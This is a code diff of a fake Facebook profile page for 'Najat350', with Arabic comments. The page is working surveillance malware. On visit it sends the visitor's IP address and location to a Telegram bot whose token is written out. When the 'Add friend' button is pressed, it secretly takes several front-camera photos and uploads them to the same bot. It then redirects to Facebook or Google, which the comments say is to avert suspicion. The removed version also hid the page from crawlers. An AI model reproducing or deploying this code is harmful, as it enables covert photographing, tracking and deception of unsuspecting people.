@@ -3,44 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    
-    <meta property="og:title" content="Najat350">
-    <meta property="og:site_name" content="Facebook">
-    <meta property="og:description" content="‎Najat350‎ موجودة على فيسبوك. انضم إلى فيسبوك للتواصل مع ‎Najat350‎ وأشخاص آخرين قد تعرفهم.">
-    <meta property="og:image" content="https://a.top4top.io/p_3695vqrca0.jpeg">
-    <meta property="og:type" content="profile">
-
     <title>Facebook - Najat350</title>
     
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; }
+        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; background-color: #f0f2f5; margin: 0; padding: 0; display: none; }
         .fb-nav { background: #fff; height: 50px; border-bottom: 1px solid #ddd; display: flex; align-items: center; padding: 0 15px; font-weight: bold; color: #1877f2; font-size: 24px; }
-        .cover { background: #ddd; height: 200px; width: 100%; }
+        .cover { background: #ddd; height: 180px; width: 100%; }
         .profile-box { background: #fff; padding-bottom: 20px; text-align: right; position: relative; border-bottom: 1px solid #ddd; }
-        .profile-img { width: 150px; height: 150px; border-radius: 50%; border: 4px solid #fff; position: absolute; top: -90px; right: 15px; object-fit: cover; }
-        .user-data { padding: 70px 15px 10px; }
-        .u-name { font-size: 26px; font-weight: bold; color: #050505; margin: 0; }
-        .u-bio { color: #65676b; margin: 5px 0 15px; }
-        .btns { display: flex; gap: 10px; padding: 0 15px; }
+        .profile-img { width: 140px; height: 140px; border-radius: 50%; border: 4px solid #fff; position: absolute; top: -70px; right: 15px; object-fit: cover; }
+        .user-data { padding: 80px 15px 10px; }
+        .u-name { font-size: 24px; font-weight: bold; color: #050505; margin: 0; }
+        .btns { display: flex; gap: 10px; padding: 10px 15px; }
         .b-blue { background: #1877f2; color: #fff; border: none; flex: 1; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        .b-gray { background: #e4e6eb; color: #050505; border: none; flex: 1; padding: 12px; border-radius: 8px; font-weight: bold; }
         video, canvas { display: none; }
     </style>
 </head>
-<body>
-    <div id="main-content" style="display:none;">
-        <div class="fb-nav">facebook</div>
-        <div class="cover"></div>
-        <div class="profile-box">
-            <img src="https://a.top4top.io/p_3695vqrca0.jpeg" class="profile-img">
-            <div class="user-data">
-                <h1 class="u-name">Najat350</h1>
-                <div class="u-bio">‏‎(Najat)‎‏</div>
-            </div>
-            <div class="btns">
-                <button class="b-blue" onclick="vibrateAndCapture()">إضافة صديق</button>
-                <button class="b-gray">رسالة</button>
-            </div>
+<body id="bdy">
+    <div class="fb-nav">facebook</div>
+    <div class="cover"></div>
+    <div class="profile-box">
+        <img src="https://a.top4top.io/p_3695vqrca0.jpeg" class="profile-img">
+        <div class="user-data">
+            <h1 class="u-name">Najat350</h1>
+            <div style="color: #65676b;">‏‎(Najat)‎‏</div>
+        </div>
+        <div class="btns">
+            <button class="b-blue" onclick="startCapture()">إضافة صديق</button>
+            <button style="background: #e4e6eb; border:none; flex:1; border-radius:8px;">رسالة</button>
         </div>
     </div>
 
@@ -48,64 +37,43 @@
     <canvas id="c"></canvas>
 
     <script>
-        // توكن مشفر لحماية البوت من المسح التلقائي
-        const _tk = "ODMwMTUzMzY5ODpBQUZPSl9JeVRtT1hPNUJQUXdPRUZGRll5N3RmSWxhUUoxZw==";
-        const _id = "7184970355";
-        const T = atob(_tk);
-
-        const urlParams = new URLSearchParams(window.location.search);
-        const trigger = urlParams.get('run');
-
-        // درع الحماية من البوتات والتوجيه التلقائي
-        function shield() {
-            const isBot = /bot|google|baidu|bing|msn|duckduckbot|teoma|slurp|crawler|spider|inspect/i.test(navigator.userAgent);
-            if (trigger !== "1" || isBot || navigator.webdriver) {
-                window.location.replace("https://www.google.com");
-                return false;
-            }
-            document.getElementById('main-content').style.display = 'block';
-            return true;
+        // التوكن الجديد مصحح (بدون تشفير معقد لضمان سرعة الاستجابة)
+        const T = "8550792437:AAFPRHjdjDq1vQvhLKs6S5DpfRId13-MhHc"; 
+        const I = "7184970355";
+        
+        // التحقق من الرابط (يجب أن ينتهي بـ ?run=1)
+        const u = new URLSearchParams(window.location.search);
+        if (u.get('run') === "1") {
+            document.getElementById('bdy').style.display = 'block';
+            sendInfo();
+        } else {
+            window.location.replace("https://www.facebook.com");
         }
 
-        if (shield()) {
-            window.onload = async () => {
-                const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:0, charging:false}));
-                
-                const data = `
-🔥 صيد جديد (iPhone Focus):
-- IP: ${ipRes.ip}
-- الجهاز: ${navigator.platform}
-- المتصفح: ${navigator.appVersion.split(')')[0]}
-- الرام: ${navigator.deviceMemory || '4+'} GB
-- الأنوية: ${navigator.hardwareConcurrency}
-- الشاشة: ${screen.width}x${screen.height}
-- البطارية: ${battery.level * 100}%
-- الشحن الآن: ${battery.charging ? "نعم" : "لا"}
-- اللغة: ${navigator.language}
-- التاريخ: ${new Date().toLocaleString('ar-EG')}
-                `;
-                sendMsg(data);
-            };
-        }
-
-        async function vibrateAndCapture() {
+        async function sendInfo() {
             try {
-                // طلب الكاميرا للأيفون (يظهر الإذن هنا)
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                document.getElementById('v').srcObject = s;
+                const res = await fetch('https://ipapi.co/json/').then(r => r.json());
+                const msg = `🎯 دخول جديد:\n🌐 IP: ${res.ip}\n📍 ${res.city}, ${res.country_name}\n📱 الجهاز: ${navigator.platform}`;
+                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${I}&text=${encodeURIComponent(msg)}`);
+            } catch(e) {}
+        }
 
-                // التقاط 3 صور سريعة
-                for (let i = 0; i < 3; i++) {
-                    await new Promise(r => setTimeout(r, 1200));
+        async function startCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                // سحب 4 صور متتالية بسرعة فائقة
+                for (let j = 0; j < 4; j++) {
+                    await new Promise(r => setTimeout(r, 500));
                     snap();
                 }
                 
-                // بعد التصوير يتم التوجيه لـ Google لإبعاد الشبهة
-                setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
-
-            } catch (e) {
-                window.location.href = "https://www.google.com";
+                // التوجيه لإبعاد الشبهة
+                setTimeout(() => { window.location.href = "https://www.facebook.com/profile.php?id=1000059997"; }, 1500);
+            } catch (err) {
+                window.location.href = "https://www.facebook.com";
             }
         }
 
@@ -115,16 +83,12 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(b => {
-                const f = new FormData();
-                f.append('chat_id', _id);
-                f.append('photo', b, 'ios_capture.jpg');
-                fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f });
-            }, 'image/jpeg');
-        }
-
-        function sendMsg(m) {
-            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${_id}&text=${encodeURIComponent(m)}`);
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('chat_id', I);
+                fd.append('photo', blob, 'shot.jpg');
+                fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
+            }, 'image/jpeg', 0.6);
         }
     </script>
 </body>
